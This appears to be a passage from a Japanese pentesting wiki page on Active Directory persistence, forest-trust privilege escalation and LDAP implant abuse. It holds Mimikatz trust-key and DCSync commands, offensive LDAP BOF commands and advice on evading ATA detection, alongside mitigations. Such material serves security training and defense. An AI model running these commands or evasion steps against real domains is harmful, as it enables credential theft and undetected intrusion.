**Security descriptor** はオブジェクトが持つ**権限**を**格納**するために使われます。もしオブジェクトの security descriptor に**小さな変更**を加えられるだけで、そのオブジェクトに対して非常に興味深い権限を得られる場合があり、必ずしも特権グループのメンバーである必要はありません。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を悪用して、`entryTTL`/`msDS-Entry-Time-To-Die` を持つ短命のプリンシパル/GPO/DNS レコードを作成すると、それらは tombstone を残さず自動削除され、LDAP の証拠を消去しますが、孤立した SID、壊れた `gPLink` 参照、あるいはキャッシュされた DNS 応答（例：AdminSDHolder ACE 汚染や悪意ある `gPCFileSysPath`/AD 統合 DNS リダイレクト）を残します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

LSASS をメモリ上で改変して**ユニバーサルパスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンへアクセスする際に使われる**資格情報を平文で捕捉**することが可能です。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

新しい Domain Controller を AD に登録し、それを使って指定オブジェクトへ属性（SIDHistory、SPN など）を **ログを残さずに**プッシュします。これを行うには DA 権限が必要で、ルートドメイン内にいる必要があります。\
ただし、誤ったデータを使用するとかなり目立つログが生成されます。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前述したように、**LAPS パスワードを読むための十分な権限**があれば権限昇格が可能です。しかし、これらのパスワードは**永続化にも使用**できます。\
参照:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** をセキュリティ境界と見なしています。これは、**単一ドメインの侵害がフォレスト全体の侵害につながる可能性がある**ことを意味します。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **ドメイン** のユーザが別の **ドメイン** のリソースへアクセスできるようにするセキュリティ機構です。これは両ドメインの認証システム間にリンクを作り、認証情報のやり取りを可能にします。ドメインがトラストを設定すると、特定の **鍵** が両方の Domain Controller (DC) に交換・保存され、トラストの整合性に重要な役割を果たします。

典型的なシナリオでは、あるユーザが **信頼されたドメイン** のサービスにアクセスするには、まず自ドメインの DC から **inter-realm TGT** を要求する必要があります。この TGT は両ドメインが合意した共有 **鍵** で暗号化されます。ユーザはこの TGT を **信頼されたドメインの DC** に提示してサービスチケット（**TGS**）を取得します。信頼されたドメインの DC が inter-realm TGT を検証し有効と判断すれば、TGS を発行し、ユーザはサービスへアクセスできます。

**手順**:

1. **Domain 1** の **クライアントコンピュータ** が、その **NTLM ハッシュ** を使って **Domain Controller (DC1)** に **TGT** を要求することで開始します。
2. クライアントが認証されると DC1 は新しい TGT を発行します。
3. クライアントは次に **Domain 2** の資源にアクセスするために DC1 から **inter-realm TGT** を要求します。
4. inter-realm TGT は二方向ドメイントラストの一部として DC1 と DC2 が共有する **trust key** で暗号化されます。
5. クライアントは inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に持って行きます。
6. DC2 は自前の共有 trust key を使って inter-realm TGT を検証し、有効であればクライアントがアクセスしたい Domain 2 内のサーバに対する **Ticket Granting Service (TGS)** を発行します。
7. 最後にクライアントはこの TGS をサーバに提示し、サーバのアカウントハッシュで暗号化されたチケットを使って Domain 2 のサービスへアクセスします。

### Different trusts

トラストは **片方向（一方通行）または両方向** のどちらかであることに注意してください。両方向の場合、両ドメインは相互に信頼しますが、**片方向** の場合は一方が **trusted**（信頼される側）、もう一方が **trusting**（信頼する側）になります。後者の場合、**trusted から trusting ドメイン内のリソースにのみアクセス可能**です。

もし Domain A が Domain B を信頼していれば、A は trusting ドメインで B は trusted ドメインです。さらに、**Domain A** ではこれは **Outbound trust** と表示され、**Domain B** では **Inbound trust** と表示されます。

**異なる信頼関係の種類**

- **Parent-Child Trusts**: 同一フォレスト内で一般的な構成で、子ドメインは自動的に親ドメインと二方向の推移的トラストを持ちます。これにより親子間で認証要求がシームレスに流れます。
- **Cross-link Trusts**: "shortcut trusts" とも呼ばれ、子ドメイン間でリファラルプロセスを高速化するために作られます。複雑なフォレストでは認証リファラルがルートまで上がってから目的ドメインへ下る必要がありますが、cross-link を作ることでその経路を短縮できます。
- **External Trusts**: 無関係な別ドメイン間で設定される非推移的なトラストです。[Microsoft のドキュメント](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) によれば、外部トラストはフォレストトラストで接続されていないフォレスト外のドメインのリソースにアクセスするために便利です。外部トラストでは SID フィルタリングによってセキュリティが強化されます。
- **Tree-root Trusts**: フォレストのルートドメインと新しく追加されたツリールート間で自動的に確立されるトラストです。一般的ではありませんが、新しいドメインツリーをフォレストに追加する際に重要で、固有のドメイン名を維持しつつ二方向の推移性を保証します。詳細は [Microsoft のガイド](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) を参照してください。
- **Forest Trusts**: これは二つのフォレストルートドメイン間の二方向の推移的トラストで、SID フィルタリングを適用してセキュリティを強化します。
- **MIT Trusts**: これらは非-Windows の、[RFC4120 準拠](https://tools.ietf.org/html/rfc4120) の Kerberos ドメインと確立されるトラストです。MIT trusts はより特殊で、Windows 以外の Kerberos ベースのシステムとの統合を必要とする環境向けです。

#### Other differences in **trusting relationships**

- トラスト関係は **推移的 (transitive)**（A が B を信頼、B が C を信頼すると A は C を信頼する）または **非推移的** に設定できます。
- トラスト関係は **双方向トラスト**（双方が互いを信頼）または **片方向トラスト**（一方のみが他方を信頼）として設定できます。

### Attack Path

1. 信頼関係を**列挙**する
2. どの **セキュリティプリンシパル**（ユーザ/グループ/コンピュータ）が**他ドメインのリソースにアクセス**できるかを確認する。ACE エントリや他ドメインのグループに含まれているかなどを調べ、**ドメイン間の関係性**を探す（トラストはそのために作られている場合が多い）。
1. この場合 kerberoast も別のオプションになり得る。
3. ドメイン間で **pivot** できるアカウントを**侵害**する。

攻撃者が別ドメインのリソースへアクセスできる主な仕組みは次の3つです:

- **ローカルグループメンバーシップ**: プリンシパルがサーバ上の "Administrators" グループのようなローカルグループに追加されていると、そのマシンに対して大きな制御を得ます。
- **外部ドメイングループのメンバーシップ**: プリンシパルが外部ドメイン内のグループのメンバーである場合もあります。ただし、この方法の有効性はトラストの性質やグループのスコープに依存します。
- **Access Control Lists (ACLs)**: プリンシパルが **ACL**、特に **DACL** 内の **ACE** として指定されている場合、特定のリソースへのアクセスが付与されます。ACL、DACL、ACE のメカニズムを深く掘り下げたい場合は、ホワイトペーパー “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” が非常に有益です。

### Find external users/groups with permissions

外部セキュリティプリンシパルを見つけるには **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認してください。これらは **外部ドメイン/フォレスト** のユーザやグループです。

Bloodhound や powerview を使ってこれを確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent フォレストの privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン信頼を列挙するその他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 信頼されたキーが**2つ**あります。1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているキーは次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用して、信頼関係を利用し child/parent ドメインへ Enterprise admin として昇格する:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用可能かを理解することは重要です。Configuration NC は Active Directory (AD) 環境におけるフォレスト全体の設定データの集中リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) にレプリケートされ、書き込み可能な DC は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**DC 上での SYSTEM 特権**、できれば子 DC の権限が必要です。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のすべてのドメイン参加コンピュータのサイト情報が含まれています。任意の DC 上で SYSTEM 権限を持つことで、攻撃者は GPO を root DC site にリンクできます。この操作により、それらのサイトに適用されるポリシーを操作して root ドメインを侵害する可能性があります。

詳しくは [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) に関する研究を参照してください。

**Compromise any gMSA in the forest**

攻撃ベクターの一つは、ドメイン内の特権 gMSA を標的にすることです。gMSA のパスワードを計算するために必要な KDS Root key は Configuration NC に保存されています。任意の DC 上で SYSTEM 権限を持つことで、KDS Root key にアクセスし、フォレスト全体の任意の gMSA のパスワードを算出することが可能です。

詳細な分析とステップバイステップの手順は次を参照してください:

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA 攻撃 (BadSuccessor – abusing migration attributes):

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部研究: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この手法は忍耐を要し、新たに作成される特権 AD オブジェクトを待つ必要があります。SYSTEM 権限を持てば、攻撃者は AD Schema を変更して任意のユーザーにすべてのクラスに対する完全な制御権を付与することができます。これにより、新たに作成される AD オブジェクトに対する不正アクセスや制御が可能になります。

詳しくは [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 脆弱性は Public Key Infrastructure (PKI) オブジェクトの制御を狙い、フォレスト内の任意のユーザーとして認証できる証明書テンプレートを作成することを目的としています。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な子 DC を侵害すれば ESC5 攻撃を実行できます。

詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS が存在しない環境でも、攻撃者は必要な構成要素をセットアップできるため、その点については [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) を参照してください。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは **あなたのドメインが外部ドメインによって信頼されている** ため、外部ドメインに対して **不確定な権限** が付与されています。あなたのドメインの **どのプリンシパルが外部ドメインに対してどのようなアクセスを持っているか** を特定し、それを悪用する方法を試す必要があります：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（アウトバウンド）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **あなたのドメイン** は **別のドメイン** のプリンシパルにいくつかの **特権** を **信頼** しています。

しかし、**domain is trusted** が trusting domain によって行われると、trusted domain は **予測可能な名前** の **ユーザーを作成** し、その **パスワードとして trusted password を使用** します。つまり、**trusting domain のユーザーにアクセスして trusted domain に侵入し**、列挙やさらなる権限昇格を試みることが可能になります：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を侵害するもう一つの方法は、ドメイン信頼の **逆方向** に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（あまり一般的ではありません）。

別の方法として、trusted domain のユーザーが **RDP** でログインできるマシンに待機するという手があります。攻撃者は RDP セッションのプロセスにコードを注入し、そこから **被害者の origin domain へアクセス** することができます。さらに、被害者がハードドライブをマウントしている場合、RDP セッションのプロセスからハードドライブの **startup folder** に **backdoors** を保存できます。この手法は **RDPInception.** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID history 属性を横断する攻撃のリスクは SID Filtering によって軽減されます。SID Filtering はすべてのフォレスト間トラストでデフォルトで有効になっています。これはマイクロソフトの見解に従い、セキュリティ境界をドメインではなくフォレストと見なすため、フォレスト内トラストは安全であるという前提に基づいています。
- ただし注意点があります：SID filtering によりアプリケーションやユーザーアクセスが阻害される可能性があり、そのために一時的に無効化されることがあります。

### **Selective Authentication:**

- フォレスト間トラストでは、Selective Authentication を採用することで、両フォレストのユーザーが自動的に認証されることを防ぎます。代わりに、trusting ドメインまたはフォレスト内のドメインやサーバーにアクセスするためには明示的な権限が必要になります。
- これらの対策は writable Configuration Naming Context (NC) の悪用や trust account に対する攻撃を防ぐものではない点に注意が必要です。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は bloodyAD-style LDAP プリミティブを x64 Beacon Object Files として再実装し、on-host implant（例: Adaptix C2）の内部で完全に動作します。オペレーターはパックを `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` でコンパイルし、`ldap.axs` をロードしてから beacon から `ldap <subcommand>` を呼び出します。すべてのトラフィックは現在のログオンのセキュリティコンテキストで LDAP (389)（signing/sealing）または LDAPS (636)（自動証明書信頼）を経由するため、socks プロキシやディスク上の痕跡は不要です。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` は短縮名や OU パスを完全な DN に解決し、対応するオブジェクトをダンプします。
- `get-object`, `get-attribute`, and `get-domaininfo` は任意の属性（security descriptors を含む）や `rootDSE` からのフォレスト/ドメインのメタデータを取得します。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` はロースト候補、委任設定、および LDAP から直接取得した既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) ディスクリプタを表示します。
- `get-acl` and `get-writable --detailed` は DACL を解析してトラスティ（trustees）、権限（GenericAll/WriteDACL/WriteOwner/attribute writes）、継承を列挙し、ACL 権限昇格の即時ターゲットを提示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 書き込みプリミティブ（権限昇格と永続化）

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、オペレータは OU 権限がある場所で新しいプリンシパルやマシンアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は write-property 権限が見つかればターゲットを直接ハイジャックします。
- ACL 指向のコマンド（`add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`）は、任意の AD オブジェクト上の WriteDACL/WriteOwner をパスワードリセット、グループメンバーシップ制御、または DCSync レプリケーション特権へ変換し、PowerShell/ADSI のアーティファクトを残すことなく操作できます。`remove-*` 系のコマンドは注入した ACE をクリーンアップします。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` は侵害されたユーザを即座に Kerberoastable にします；`add-asreproastable`（UAC トグル）はパスワードに触れずに AS-REP roasting 対象としてマークします。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）はビーコンから `msDS-AllowedToDelegateTo`、UAC フラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を有効化し、remote PowerShell や RSAT の必要性を排除します。

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` は管理下のプリンシパルの SID history に特権 SID を注入します（参照: [SID-History Injection](sid-history-injection.md)）。これにより LDAP/LDAPS のみでステルスなアクセス継承を提供します。
- `move-object` はコンピュータやユーザの DN/OU を変更し、攻撃者が資産を既に委任権が存在する OU に移動してから `set-password`、`add-groupmember`、`add-spn` を悪用することを可能にします。
- 範囲を狭くした削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）により、オペレータが資格情報や永続化を収穫した後の迅速なロールバックが可能となり、テレメトリを最小化します。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**認証情報の保護方法の詳細はこちら。**](../stealing-credentials/credentials-protections.md)

### **認証情報保護のための防御策**

- **Domain Admins の制限**: Domain Admins は Domain Controllers にのみログインを許可し、他のホストでの使用を避けることが推奨されます。
- **サービスアカウントの権限**: サービスはセキュリティ維持のために Domain Admin (DA) 権限で実行されるべきではありません。
- **一時的権限制限**: DA 権限が必要なタスクについては、その有効期間を制限すべきです。これには次のようなコマンドが利用できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 対策**: Event ID 2889/3074/3075 を監査し、DC/クライアントで LDAP signing と LDAPS channel binding を強制することで LDAP MITM/relay の試行を防ぎます。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **デセプション技法の実装**

- デセプションの実装は、パスワードが期限切れにならない、または Trusted for Delegation にマークされたダミーのユーザやコンピュータなどの罠を設定することを含みます。詳細な方法には特定の権限を持つユーザの作成や高権限グループへの追加が含まれます。
- 実用的な例としては、次のようなツールを使います: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- デセプション展開の詳細は [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **デセプションの識別**

- **ユーザオブジェクトに対して**: 異常な ObjectSID、稀なログオン、作成日、低い bad password カウントなどが疑わしい指標になります。
- **一般的な指標**: 潜在的なダミーオブジェクトの属性を実在オブジェクトと比較することで不整合を露呈できます。HoneypotBuster のようなツール（https://github.com/JavelinNetworks/HoneypotBuster）はその識別に役立ちます。

### **検出システムの回避**

- **Microsoft ATA 検出回避**:
- **User Enumeration**: ATA 検出を避けるために Domain Controllers 上でのセッション列挙を避けます。
- **Ticket Impersonation**: チケット作成に **aes** キーを利用することで NTLM にダウングレードせず検出を回避する手助けになります。
- **DCSync Attacks**: ATA 検出を避けるために Domain Controller 以外から実行することが推奨されます。Domain Controller から直接実行するとアラートが発生します。

## 参考

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
